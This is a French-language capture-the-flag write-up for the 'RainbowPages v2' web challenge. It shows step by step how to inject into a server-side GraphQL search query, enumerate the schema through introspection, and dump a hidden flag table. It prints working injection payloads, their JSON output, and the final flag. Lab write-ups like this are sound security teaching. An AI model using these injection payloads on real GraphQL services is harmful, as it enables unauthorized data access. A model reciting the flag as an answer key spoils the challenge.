# RainbowPages v2 - Web - 500pts

> La première version de notre plateforme de recherche de cuisiniers présentait quelques problèmes de sécurité. Heureusement, notre développeur ne compte pas ses heures et a corrigé l'application en nous affirmant que plus rien n'était désormais exploitable. Il en a également profiter pour améliorer la recherche des chefs.

> Pouvez-vous encore trouver un problème de sécurité ?

Suite au premier challenge du même nom, on se retrouve face à un nouveau problème.
Pour rappel, dans le premier challenge, il était possible d'envoyer requête GraphQL directement depuis le client.

Dans cette nouvelle version, la requête semble être côté serveur.
Il nous est également indiqué que la recherche des chefs a été améliorée.


```javascript
var searchValue = btoa(searchInput);
			var bodyForm = new FormData();
			bodyForm.append("search", searchValue);

			fetch("index.php?search="+searchValue, {
				method: "GET"
			}).then(function(response) {
				response.json().then(function(data) {
					data = eval(data);
					data = data['data']['allCooks']['nodes'];
					$("#results thead").show()
					var table = $("#results tbody");
					table.html("")
					$("#empty").hide();
					data.forEach(function(item, index, array){
						table.append("<tr class='table-dark'><td>"+item['firstname']+" "+ item['lastname']+"</td><td>"+item['speciality']+"</td><td>"+(item['price']/100)+"</td></tr>");
					});
					$("#count").html(data.length)
					$("#count").show()
				});
			});
```

Nous ne contrôlons désormais seulement le nom du chef à rechercher.

## Analyse du fonctionnement de la nouvelle application

Après quelques tests sur la recherche, on remarque que dans cette version nous pouvons également chercher un chef par son nom de famille en plus de son prénom.

En se basant sur la requête de la version précédente, nous pouvons donc deviner le contenu de la requête utilisée:

```graphql
{ 
    allCooks (filter: { 
        or: [
		    { firstname: {like: "%$input%"} },
		    { lastname: {like: "%$input%"} }
        ]
    }) { 
		nodes { 
			firstname, 
			lastname, 
			speciality, 
			price 
		}
	}
}
```

## Recherche d'une vulnérabilité

On peut donc se demander si ce développeur qui "ne compte pas ses heures" n'a laissé aucun problème apparent (spoil: oh que si)
Nous allons donc essayer d'injecter le champ **lastname** de la requête afin d'ajouter notre propre requête.

En GraphQL, nous pouvons appeler plusieurs requêtes simplement en les juxtaposant, par exemple:

```graphql
{
	query1 { ... }
	query2 { ... }
}
```

Nous devons donc ajouter notre requête après l'accolade fermante de **allCooks**, comme ceci:

```graphql
{ 
    allCooks (filter: { 
        or: [
		    { firstname: {like: "%$input%"} },
		    { lastname: {like: "%$input%"} }
        ]
    }) { 
		nodes { 
			firstname, 
			lastname, 
			speciality, 
			price 
		}
	}

	evil { }
}
```

Pour y arriver, nous devons respecter le contenu de la requête lors de l'injection, en respectant l'ordre des accolades / crochets fermants.

```graphql
"}}]}) { nodes { firstname } } evil { }#
```

Le **#** nous permet de commenter le reste de la requête afin qu'elle ne soit pas prise en compte.

## Exploration du schéma

Une fois que notre injection est valide, nous devons énumérer le schéma afin de trouver le nom des différentes tables / requêtes / champs.
Nous allons par exemple énumérer dans un premier temps les différentes requêtes présentes avec l'injection suivante:

```graphql
"}}]}) { nodes { firstname }} __schema { queryType { fields { name description } }}}#
```

Ce qui nous renvoie l'objet suivant:

```graphql
{
  "__schema": {
    "queryType": {
      "fields": [
        {
          "name": "query",
          "description": "Exposes the root query type nested one level down. This is helpful for Relay 1 which can only query top level fields if they are in a particular form."
        },
        {
          "name": "nodeId",
          "description": "The root query type must be a `Node` to work well with Relay 1 mutations. This just resolves to `query`."
        },
        {
          "name": "node",
          "description": "Fetches an object given its globally unique `ID`."
        },
        {
          "name": "allCooks",
          "description": "Reads and enables pagination through a set of `Cook`."
        },
        {
          "name": "allFlagNotTheSameTableNames",
          "description": "Reads and enables pagination through a set of `FlagNotTheSameTableName`."
        },
        {
          "name": "cookById",
          "description": null
        },
        {
          "name": "flagNotTheSameTableNameById",
          "description": null
        },
        {
          "name": "cook",
          "description": "Reads a single `Cook` using its globally unique `ID`."
        },
        {
          "name": "flagNotTheSameTableName",
          "description": "Reads a single `FlagNotTheSameTableName` using its globally unique `ID`."
        }
      ]
    }
  }
}
```

On remarque 3 requêtes pour le moins intéressantes:
* allFlagNotTheSameTableNames
* flagNotTheSameTableNameById
* flagNotTheSameTableName

Il nous est aussi gracieusement donné le nom d'une table **FlagNotTheSameTableName**.
Nous allons maintenant énumérer les différents champs de cette table pouvant contenir ce flag tant désiré:

```graphql
"}}]}) { nodes { firstname }} __type(name: "FlagNotTheSameTableName") { name fields { name type { name kind}}}}#
```

Qui nous renvoie:

```graphql
{
  "__type": {
    "name": "FlagNotTheSameTableName",
    "fields": [
      {
        "name": "nodeId",
        "type": {
          "name": null,
          "kind": "NON_NULL"
        }
      },
      {
        "name": "id",
        "type": {
          "name": null,
          "kind": "NON_NULL"
        }
      },
      {
        "name": "flagNotTheSameFieldName",
        "type": {
          "name": "String",
          "kind": "SCALAR"
        }
      }
    ]
  }
}
```

Ça y est, on a tout ce qui nous faut pour récupérer notre flag! 

## Récupération du flag

Nous devons maintenant éxecuter la requête suivante pour récupérer notre flag.

```graphql
allFlagNotTheSameTableNames 
{
	{ 
		nodes { flagNotTheSameFieldName }
	}
}
```

Ce qui nous donne du côté de l'injection:

```graphql
"}}]}) { nodes { firstname }} allFlagNotTheSameTableNames { nodes { flagNotTheSameFieldName }}}#
```

```graphql
{
  "allFlagNotTheSameTableNames": {
    "nodes": [
      {
        "flagNotTheSameFieldName": "FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}"
      }
    ]
  }
}
```

Boom, terminé.

Flag: FCSC{70c48061ea21935f748b11188518b3322fcd8285b47059fa99df37f27430b071}